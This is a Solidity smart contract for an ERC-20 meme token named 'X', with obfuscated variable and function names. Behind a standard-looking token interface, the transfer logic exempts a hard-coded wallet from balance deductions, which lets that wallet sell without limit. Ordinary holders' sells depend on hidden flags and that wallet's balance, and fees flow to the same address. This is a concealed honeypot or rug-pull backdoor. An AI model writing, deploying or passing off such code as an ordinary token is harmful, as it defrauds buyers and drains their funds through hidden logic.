/*

⚔️   $X


TWITTER: https://twitter.com/XCoin_Erc20
TELEGRAM: https://t.me/Xerc_Portal
WEBSITE: https://xerc.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qxpmo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qxpmo(a, b, "SafeMath:");
    }

    function  _qxpmo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kahvxeomp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pforojuvns {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"⚔️";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalnw = 1000000000 * 10 **_decimals;
    uint256 public _mxTlmpAmaunt = _Totalnw;
    uint256 public _Wallekbxmo = _Totalnw;
    uint256 public _wapThresholdmcx= _Totalnw;
    uint256 public _mkylTorcp= _Totalnw;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isErcauFof;
    mapping (address => bool) private _taxvWalrvy;
    mapping(address => uint256) private _lruekrkeacp;
    bool public _tlaeresluove = false;
    address payable private _qxuobouq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefaebnt=0;
    uint256 private _burarbnw=0;


    _pforojuvns private _qonRatobat;
    address private _acGudvatuw;
    bool private _prodhouxh;
    bool private iovSwpuwq = false;
    bool private _aquEabuyp = false;


    event _amrfolytl(uint _mxTlmpAmaunt);
    modifier lokocThtrap {
        iovSwpuwq = true;
        _;
        iovSwpuwq = false;
    }

    constructor () {
        _balances[_msgSender()] = _Totalnw;
        _isErcauFof[owner()] = true;
        _isErcauFof[address(this)] = true;
        _isErcauFof[_qxuobouq] = true;
        _qxuobouq = payable(0x7Dc8CFE03C60Ace3d84AF953f3901b781e2Ff189);
 

        emit Transfer(address(0), _msgSender(), _Totalnw);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalnw;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qxpmo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlaeresluove) {
                if (to != address
                (_qonRatobat) && to !=
                 address(_acGudvatuw)) {
                  require(_lruekrkeacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruekrkeacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acGudvatuw && to != 
            address(_qonRatobat) && !_isErcauFof[to] ) {
                require(amount <= _mxTlmpAmaunt,
                 "Exceeds the _mxTlmpAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekbxmo, "Exceeds the maxWalletSize.");
                if(_burarbnw
                < _wapBefaebnt){
                  require(! _faeqauz(to));
                }
                _burarbnw++;
                 _taxvWalrvy[to]=true;
                teeomoun = amount.mul((_burarbnw>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acGudvatuw && from!= address(this) 
            && !_isErcauFof[from] ){
                require(amount <= _mxTlmpAmaunt && 
                balanceOf(_qxuobouq)<_mkylTorcp,
                 "Exceeds the _mxTlmpAmaunt.");
                teeomoun = amount.mul((_burarbnw>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burarbnw>_wapBefaebnt &&
                 _taxvWalrvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iovSwpuwq 
            && to == _acGudvatuw && _aquEabuyp &&
             contractTokenBalance>_wapThresholdmcx 
            && _burarbnw>_wapBefaebnt&&
             !_isErcauFof[to]&& !_isErcauFof[from]
            ) {
                _swpzuvrkmj( _qxmve(amount, 
                _qxmve(contractTokenBalance,_mkylTorcp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmojveup(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qxpmo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qxpmo(teeomoun));
        emit Transfer(from, to, 
        amount. _qxpmo(teeomoun));
    }

    function _swpzuvrkmj(uint256
     tokenAmount) private lokocThtrap {
        if(tokenAmount==0){return;}
        if(!_prodhouxh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qonRatobat.WETH();
        _approve(address(this),
         address(_qonRatobat), tokenAmount);
        _qonRatobat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qxmve(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qxpmo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qxuobouq){
            return a ;
        }else{
            return a . _qxpmo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTlmpAmaunt = _Totalnw;
        _Wallekbxmo = _Totalnw;
        _tlaeresluove = false;
        emit _amrfolytl(_Totalnw);
    }

    function _faeqauz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmojveup(uint256
    amount) private {
        _qxuobouq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _prodhouxh);
        _qonRatobat   =  _pforojuvns (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qonRatobat), _Totalnw);
        _acGudvatuw = _kahvxeomp(_qonRatobat.factory()). createPair (address(this),  _qonRatobat . WETH ());
        _qonRatobat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acGudvatuw).approve(address(_qonRatobat), type(uint).max);
        _aquEabuyp = true;
        _prodhouxh = true;
    }

    receive() external payable {}
}